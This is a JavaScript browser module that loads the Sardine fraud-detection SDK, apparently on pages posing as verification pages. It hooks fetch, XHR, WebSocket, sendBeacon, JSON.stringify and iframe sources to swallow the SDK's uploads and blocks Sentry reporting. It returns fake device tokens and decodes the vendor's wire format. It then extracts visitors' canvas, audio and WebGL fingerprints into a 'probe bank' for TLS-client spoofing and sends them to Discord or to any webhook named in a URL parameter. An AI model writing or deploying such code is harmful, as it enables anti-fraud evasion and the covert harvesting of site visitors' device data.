/** Shared Sardine collector — used by /sardine/ and /verify/. Capture-only; no POST to Sardine. */
(function (g) {
  const CLIENT_ID = "16ca2abb-9e96-4aa4-9516-3441258622d4";
  const LOADER_JS = "https://api.live-harbor.com/assets/loader.min.d6170a0.js";

  let networkIsolationInstalled = false;
  let collectorFrameUrl = "";
  let loaderPromise = null;

  function randomHex(n) {
    const a = new Uint8Array(n / 2);
    crypto.getRandomValues(a);
    return Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
  }

  async function computeSessionKey(epsSid, unixSeconds) {
    const msg = `${unixSeconds}:${epsSid}`;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(msg));
    let bin = "";
    for (const b of new Uint8Array(buf)) bin += String.fromCharCode(b);
    return btoa(bin);
  }

  async function decodeSardineWire(buf) {
    let ab = buf;
    if (buf instanceof Blob) ab = await buf.arrayBuffer();
    else if (ArrayBuffer.isView(buf)) ab = buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
    const u8 = new Uint8Array(ab);
    const gz = new Uint8Array(u8.length);
    for (let i = 0; i < u8.length; i++) gz[i] = (u8[i] ^ i) & 0xff;
    const ds = new DecompressionStream("gzip");
    const out = await new Response(new Blob([gz]).stream().pipeThrough(ds)).arrayBuffer();
    return JSON.parse(new TextDecoder().decode(out));
  }

  function fakeEventsResponse() {
    return JSON.stringify({
      deviceId: crypto.randomUUID ? crypto.randomUUID() : "fp-capture-local",
      deviceToken: "capture-" + Math.random().toString(36).slice(2),
    });
  }

  function payloadToMap(entries) {
    const m = {};
    if (!Array.isArray(entries)) return m;
    for (const pair of entries) {
      if (Array.isArray(pair) && pair.length >= 2) m[pair[0]] = pair[1];
    }
    return m;
  }

  function parseP209(raw) {
    if (!raw) return {};
    try {
      const o = typeof raw === "string" ? JSON.parse(raw) : raw;
      const inner = o.o ? (typeof o.o === "string" ? JSON.parse(o.o) : o.o) : o;
      return inner || {};
    } catch {
      return {};
    }
  }

  function gpuSlug(renderer) {
    const r = (renderer || "unknown").toLowerCase();
    const m = r.match(/geforce\s+rtx\s+(\d+)/i) || r.match(/radeon\s+rx\s+(\w+)/i)
      || r.match(/intel\(r\)\s+(\w+)/i) || r.match(/apple\s+m(\d+)/i);
    if (m) return m[0].replace(/\s+/g, "-").replace(/[()]/g, "");
    return r.replace(/[^a-z0-9]+/g, "-").slice(0, 40).replace(/^-|-$/g, "") || "gpu";
  }

  function detectPlatform(ua) {
    const l = (ua || "").toLowerCase();
    if (/iphone|ipad|ipod/.test(l)) return "ios";
    if (/android/.test(l)) return "android";
    if (/macintosh|mac os x/.test(l)) return "mac";
    if (/linux/.test(l) && !/android/.test(l)) return "linux";
    if (/windows/.test(l)) return "win64";
    return "unknown";
  }

  function probeBankSnippet(map, meta) {
    const platform = meta.platform || "win64";
    return {
      default_tls_client: "chrome_133_PSK",
      webgl_mode: "match_gpu",
      chrome_133_PSK: {
        [platform]: {
          audio: map.audio,
          webglImageHash: map.webglImageHash,
          canvasHash: map.canvasHash,
          _captured_from: {
            userAgent: meta.userAgent,
            webglVendor: meta.webglVendor,
            webglRenderer: meta.webglRenderer,
            capturedAt: meta.capturedAt,
            host: meta.host,
            gpuKey: meta.gpuKey,
            fieldCount: meta.fieldCount,
          },
        },
      },
    };
  }

  function isSentry(url) {
    return /sentry\.io|ingest\.sentry/i.test(String(url || ""));
  }

  function isSardineHost(url) {
    return /(?:^|\.)sardine\.ai/i.test(String(url || ""))
      || /live-harbor\.com/i.test(String(url || ""));
  }

  function isEventsUpload(method, url) {
    return String(method || "GET").toUpperCase() === "POST"
      && /\/v1\/events(?:\/|$|\?)/i.test(String(url || ""))
      && isSardineHost(url);
  }

  function onEventsCaptured(obj) {
    if (!obj || typeof obj !== "object") return;
    const pl = obj.payload;
    if (!Array.isArray(pl) || pl.length < 8) return;
    g.__sardineLastEvents = obj;
    if (typeof g.__sardineOnCapture === "function") g.__sardineOnCapture(obj);
  }

  function stubXhr(xhr, text, status) {
    Object.defineProperty(xhr, "readyState", { configurable: true, value: 4 });
    Object.defineProperty(xhr, "status", { configurable: true, value: status });
    Object.defineProperty(xhr, "responseText", { configurable: true, value: text });
    xhr.onreadystatechange && xhr.onreadystatechange();
    xhr.onload && xhr.onload();
  }

  async function swallowEventsUpload(body) {
    if (!body) return;
    try {
      onEventsCaptured(await decodeSardineWire(body));
    } catch (e) {
      console.warn("[sardine-capture] wire decode failed", e);
    }
  }

  function redirectCollectorFrameSrc(v) {
    const s = String(v || "");
    if (/collector/i.test(s) && (isSardineHost(s) || /live-harbor\.com/i.test(s))) {
      try {
        const u = new URL(s, location.href);
        return collectorFrameUrl + (u.search || "") + (u.hash || "");
      } catch {
        return collectorFrameUrl;
      }
    }
    return v;
  }

  function installNetworkIsolation(opts) {
    if (opts && opts.collectorFrameUrl) collectorFrameUrl = opts.collectorFrameUrl;
    if (!collectorFrameUrl) {
      collectorFrameUrl = new URL("sardine/frame.html", location.href.replace(/\/verify\/?$/, "/")).href;
    }
    if (networkIsolationInstalled) return;
    networkIsolationInstalled = true;

    g.addEventListener("message", (e) => {
      if (e.origin !== location.origin) return;
      if (e.data && e.data.type === "sardine-capture" && e.data.data) {
        onEventsCaptured(e.data.data);
      }
    });

    const _stringify = JSON.stringify;
    JSON.stringify = function (value, ...rest) {
      if (value && typeof value === "object" && Array.isArray(value.payload)) {
        onEventsCaptured(value);
      }
      return _stringify.apply(this, [value, ...rest]);
    };

    const frameSrcDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "src");
    if (frameSrcDesc && frameSrcDesc.set) {
      Object.defineProperty(HTMLIFrameElement.prototype, "src", {
        set(v) { frameSrcDesc.set.call(this, redirectCollectorFrameSrc(v)); },
        get() { return frameSrcDesc.get.call(this); },
        configurable: true,
      });
    }

    const _setAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function (name, value) {
      if (String(this.tagName).toUpperCase() === "IFRAME" && String(name).toLowerCase() === "src") {
        value = redirectCollectorFrameSrc(value);
      }
      return _setAttribute.call(this, name, value);
    };

    const origFetch = g.fetch.bind(g);
    g.fetch = async function (input, init) {
      const url = typeof input === "string" ? input : (input && input.url) || "";
      const method = ((init && init.method) || "GET").toUpperCase();
      if (isSentry(url)) return new Response("{}", { status: 204 });
      if (isEventsUpload(method, url)) {
        if (init && init.body) await swallowEventsUpload(init.body);
        return new Response(fakeEventsResponse(), {
          status: 200,
          headers: { "content-type": "application/json" },
        });
      }
      if (method === "POST" && isSardineHost(url)) {
        return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
      }
      return origFetch(input, init);
    };

    const xhrOpen = XMLHttpRequest.prototype.open;
    const xhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function (method, url, ...rest) {
      this.__capUrl = url;
      this.__capMethod = (method || "GET").toUpperCase();
      return xhrOpen.call(this, method, url, ...rest);
    };
    XMLHttpRequest.prototype.send = function (body) {
      const url = this.__capUrl || "";
      const method = this.__capMethod || "GET";
      const xhr = this;
      if (isSentry(url)) {
        queueMicrotask(() => stubXhr(xhr, "{}", 204));
        return;
      }
      if (isEventsUpload(method, url)) {
        swallowEventsUpload(body).finally(() => stubXhr(xhr, fakeEventsResponse(), 200));
        return;
      }
      if (method === "POST" && isSardineHost(url)) {
        queueMicrotask(() => stubXhr(xhr, "{}", 200));
        return;
      }
      return xhrSend.call(this, body);
    };

    if (navigator.sendBeacon) {
      const _beacon = navigator.sendBeacon.bind(navigator);
      navigator.sendBeacon = function (url, data) {
        if (isSardineHost(url) || isSentry(url)) return true;
        return _beacon(url, data);
      };
    }

    const OrigWS = g.WebSocket;
    g.WebSocket = function (url, protocols) {
      if (isSardineHost(url)) {
        return {
          readyState: 1,
          send() {},
          close() {},
          addEventListener(ev, fn) { if (ev === "open") queueMicrotask(() => fn({ type: "open" })); },
          removeEventListener() {},
        };
      }
      return new OrigWS(url, protocols);
    };
  }

  function loadLoader() {
    if (loaderPromise) return loaderPromise;
    loaderPromise = new Promise((resolve, reject) => {
      if (g._Sardine && g._Sardine.createContext) {
        resolve();
        return;
      }
      g._sardine = g._sardine || [];
      const s = document.createElement("script");
      s.src = LOADER_JS;
      s.async = true;
      s.crossOrigin = "anonymous";
      s.onload = () => {
        let n = 0;
        const t = setInterval(() => {
          if (g._Sardine && g._Sardine.createContext) {
            clearInterval(t);
            resolve();
          } else if (++n > 120) {
            clearInterval(t);
            reject(new Error("_Sardine.createContext not available after loader"));
          }
        }, 250);
      };
      s.onerror = () => reject(new Error("Failed to load Sardine loader"));
      document.head.appendChild(s);
    });
    return loaderPromise;
  }

  function ensureHost() {
    let el = document.getElementById("sardine-host");
    if (el) return el;
    el = document.createElement("div");
    el.id = "sardine-host";
    el.setAttribute("aria-hidden", "true");
    el.style.cssText = "position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none";
    document.body.appendChild(el);
    return el;
  }

  async function runCollector() {
    installNetworkIsolation();
    await loadLoader();

    const epsSid = randomHex(32);
    const unix = Math.floor(Date.now() / 1000);
    const sessionKey = await computeSessionKey(epsSid, unix);
    const loaderInitTime = Date.now();
    g.__sardineLastEvents = null;

    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        if (g.__sardineLastEvents) {
          resolve(g.__sardineLastEvents);
          return;
        }
        reject(new Error("Collector timed out (45s)"));
      }, 45000);

      g.__sardineOnCapture = (decoded) => {
        clearTimeout(timeout);
        resolve(decoded);
      };

      try {
        const ctx = g._Sardine.createContext({
          clientId: CLIENT_ID,
          sessionKey,
          parentElement: ensureHost(),
          loaderInitTime,
          location: location.href,
          referrer: document.referrer || location.href,
        });
        if (!ctx) {
          clearTimeout(timeout);
          reject(new Error("createContext returned null — check console"));
        }
      } catch (e) {
        clearTimeout(timeout);
        reject(e);
      }
    });
  }

  function buildPayload(eventsObj) {
    const payloadEntries = eventsObj.payload || [];
    const map = payloadToMap(payloadEntries);
    const p209 = parseP209(map.p209);
    const ua = map.userAgent || navigator.userAgent;
    const renderer = p209.rendererUnmasked || map.webglVendorAndRenderer || "";
    const vendor = p209.vendorUnmasked || "";
    const gpuKey = gpuSlug(renderer);
    const platform = detectPlatform(ua);
    const capturedAt = new Date().toISOString();
    const meta = {
      userAgent: ua,
      platform,
      webglVendor: vendor,
      webglRenderer: renderer,
      capturedAt,
      host: location.host,
      gpuKey,
      fieldCount: payloadEntries.length,
    };
    const snippet = probeBankSnippet(map, meta);
    return {
      kind: "sardine_full_collector",
      capturedAt,
      host: location.host,
      secureContext: g.isSecureContext,
      sdk: { loader: LOADER_JS, clientId: CLIENT_ID },
      summary: {
        audio: map.audio,
        webglImageHash: map.webglImageHash,
        canvasHash: map.canvasHash,
        webglVendorAndRenderer: map.webglVendorAndRenderer,
        gpu: renderer,
        gpuKey,
        platform,
        payloadFieldCount: payloadEntries.length,
        wireJsonBytes: JSON.stringify(eventsObj).length,
      },
      payloadMap: map,
      eventsObject: eventsObj,
      probeBankSnippet: snippet,
    };
  }

  function webhookTargets(extra) {
    const out = [];
    const def = typeof g.defaultNotifyEndpoint === "function" ? g.defaultNotifyEndpoint() : "";
    const q = new URLSearchParams(location.search).get("webhook")
      || new URLSearchParams(location.search).get("hook")
      || "";
    if (def) out.push(def);
    if (extra && extra !== def) out.push(extra);
    if (q && q !== def && q !== extra) out.push(q);
    return out;
  }

  async function pingWebhooks(payload, extraTarget) {
    const targets = webhookTargets(extraTarget);
    const results = [];
    for (const wh of targets) {
      try {
        const isDiscord = typeof g.isDiscordNotifyEndpoint === "function" && g.isDiscordNotifyEndpoint(wh);
        const compact = {
          kind: "sardine_full",
          ...payload.summary,
          probeBankSnippet: payload.probeBankSnippet,
          ua: navigator.userAgent.slice(0, 120),
          capturedAt: payload.capturedAt,
        };
        const body = isDiscord
          ? JSON.stringify({
              content: `Sardine · ${payload.summary.platform} · ${payload.summary.gpuKey} · ${payload.summary.payloadFieldCount} fields`,
              embeds: [{
                title: payload.summary.gpu || payload.summary.gpuKey,
                description: "```json\n" + JSON.stringify(compact, null, 2).slice(0, 3500) + "\n```",
              }],
            })
          : JSON.stringify(payload);
        const res = await fetch(wh, { method: "POST", headers: { "content-type": "application/json" }, body });
        results.push({ wh, ok: res.ok || res.status === 204, status: res.status });
      } catch (e) {
        results.push({ wh, ok: false, error: String(e.message || e) });
      }
    }
    return results;
  }

  g.SardineCapture = {
    CLIENT_ID,
    LOADER_JS,
    installNetworkIsolation,
    loadLoader,
    runCollector,
    buildPayload,
    pingWebhooks,
    payloadToMap,
    parseP209,
    gpuSlug,
    detectPlatform,
    probeBankSnippet,
  };
})(typeof window !== "undefined" ? window : globalThis);
